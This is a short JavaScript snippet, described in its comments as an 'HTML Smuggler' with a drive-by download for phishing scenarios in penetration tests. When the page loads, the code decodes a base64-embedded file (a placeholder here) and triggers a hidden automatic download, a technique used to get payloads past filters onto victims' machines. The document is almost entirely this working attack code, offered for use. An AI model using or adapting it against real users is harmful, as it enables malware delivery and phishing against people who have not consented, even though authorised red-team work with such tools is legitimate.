//your obvious HTML Smuggler with drive by to be used in pen test pishing scenarios... 
//workings: dump file into base64 string... 
//copy/paste in "file" variable
//set a file name in "fileName" variable
//send it...

window.onload = function() {

function base64ToArrayBuffer(base64) {
  var binary_string = window.atob(base64);
  var len = binary_string.length;
  var bytes = new Uint8Array( len );
  for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
  return bytes.buffer;
}

var file =‘<your random base64 encoded /dumped file>’;
var data = base64ToArrayBuffer(file);
var blob = new Blob([data], {type: 'octet/stream'});
var fileName = '<FileName goes here...>';

if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
else {
  var a = document.createElement('a');
  document.body.appendChild(a);
  a.style = 'display: none';
  var url = window.URL.createObjectURL(blob);
  a.href = url;
  a.download = fileName;
  a.click();
  window.URL.revokeObjectURL(url);
}

};

